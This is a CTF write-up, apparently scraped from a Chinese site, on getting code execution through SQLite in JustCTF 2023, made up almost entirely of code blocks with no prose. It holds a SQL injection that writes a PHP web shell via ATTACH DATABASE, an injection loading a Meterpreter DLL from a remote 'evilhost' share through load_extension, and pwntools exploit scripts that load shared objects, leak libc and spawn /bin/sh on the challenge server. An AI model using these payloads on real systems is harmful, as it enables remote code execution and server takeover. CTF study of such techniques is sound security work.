# 从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法

> 原文: https://www.ctfiot.com/117905.html
> ID: 117905


```
1
2
3
```



```
?id=bob'; ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn 
(dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<? system($_GET['cmd']); 
?>';--
```



```
1
2
```



```
?name=123 UNION SELECT 
1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
```



```
from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
import binascii
p = remote("0.0.0.0",13337)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
sla(b"> ",b"CREATE TABLE images(name TEXT, type TEXT, img BLOB);")
with open("./exp.so",'rb') as f:
 dt = f.read()
sla(b"> ",b"INSERT INTO images(name,type,img)")

dt = binascii.hexlify(dt)
# warning(chr(dt[1]))

print(dt.decode())
# input()

sla(b"> ",f"VALUES('icon','jpeg',cast(x'{dt.decode()}' as text));")
sla(b"> ",b"SELECT writefile('./exp.so',img) FROM images WHERE name='icon';")
# print(hex(int(p.readline())))
sla(b"> ",b"select Load_extension('./exp','exp');")
p.interactive()
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
```



```
from pwn import *

# p = process("./sqlite3")
#context.log_level='debug'
#p = remote("0.0.0.0",13339)
p = remote('notabug2.nc.jctf.pro', 1337)
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');")
ru(": \n")
lic = u64(p.recvn(6).ljust(8,b'\x00'))
warning(hex(lic))
pie_base = lic - 0x1589a0

heap = 0x00005555556b0000-0x0000555555554000+pie_base # 1/0x2000

# system_plt = (pie_base+0x2228C)
system_plt = pie_base + 0x10910
if pie_base > 0x600000000000:
 p.close()
warning(hex(pie_base)) #lic+0x28b8
sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');")
p.sendline(p64(heap+0x11eb0)+b'a'*0x8+p64(pie_base+0x000000000009e0ad))
# raw_input()
dt = b"/bin/sh\0"+flat([0]*8)+ flat([0]*8)+ p64(system_plt)
sla(b"lite> ",f"select cast(x'{dt.hex()}' as text), ".encode()+b"Load_extension('"+p64(system_plt)[:6]+b"','/bin/sh');")
p.sendline(b"echo n132")
# p.interactive()
data = p.read(timeout=1)
if b'n132' in data:
 p.sendline("/jailed/readflag")
 input()
 p.interactive()
else:
 p.close()
```



```
1
```



```
.system CMD ARGS…	Run CMD ARGS… in a system shell
```



```
1
2
3
4
```



```
# root @ pwnable in /tmp/private [14:10:59]
$ cat run-sqlite.sh
#!/bin/bash
sed -ue '/^\./ { /^\.open/!d; }' | /jailed/sqlite3 -interactive#
```



```
1
2
3
4
```



```
select load_extension('/lib/x86_64-linux-gnu/libc-2.31', 'getchar');
 .system /jailed/readflag
Runtime error: error during initialization: 
justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}
```



```
1
2
```



```
sqlite3_create_function(p->db, "edit", 2, SQLITE_UTF8, 0,
 editFunc, 0, 0);
```



```
1
2
3
4
5
6
7
```



```
zCmd = sqlite3_mprintf("%s \"%s\"", zEditor, zTempFile);
if( zCmd==0 ){
 sqlite3_result_error_nomem(context);
 goto edit_func_end;
}
rc = system(zCmd);
sqlite3_free(zCmd);
```



```
1
2
3
4
5
6
```



```
sqlite> .open :memory:
sqlite> CREATE TABLE t(a INT, b VARCHAR(200));
sqlite> insert into t values (0, '');
sqlite> update t set b=edit('','/jailed/readflag') where a=0;
justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}
```
